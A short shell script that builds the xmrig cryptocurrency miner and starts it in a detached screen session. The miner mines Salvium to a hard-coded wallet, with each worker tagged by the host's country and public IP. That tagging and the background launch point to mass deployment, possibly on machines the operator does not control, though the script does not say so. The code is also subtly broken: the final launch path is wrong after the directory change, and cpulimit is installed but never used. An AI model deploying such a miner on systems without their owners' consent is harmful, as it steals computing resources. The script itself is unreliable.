#!/bin/sh
sudo apt-get update -y

IP4=$(curl -4 -s icanhazip.com)
convert_dots_to_underscore() {
    echo "$1" | tr '.' '_'
}
IP4_UNDERSCORE=$(convert_dots_to_underscore "$IP4")
sudo apt-get install cpulimit jq -y
country=$(curl -s ipinfo.io | jq -r '.country')

sudo apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
git clone https://github.com/salvium/xmrig.git
mkdir xmrig/build && cd xmrig/build
cmake ..
make -j$(nproc)
screen -dmS sal bash xmrig/build/xmrig -a rx/0 --url randomx.rplant.xyz:17130 --tls --user SaLvdWJH7A2CncTWamHp19ZTAJwQzzUzgMhNvyBaQ4VCW9zHauUNVcLdF1FiUunwUZ6GL6C36227BNZjSpFi3pZtSWGENhZJhdV.$country-$IP4_UNDERSCORE --coin=SAL
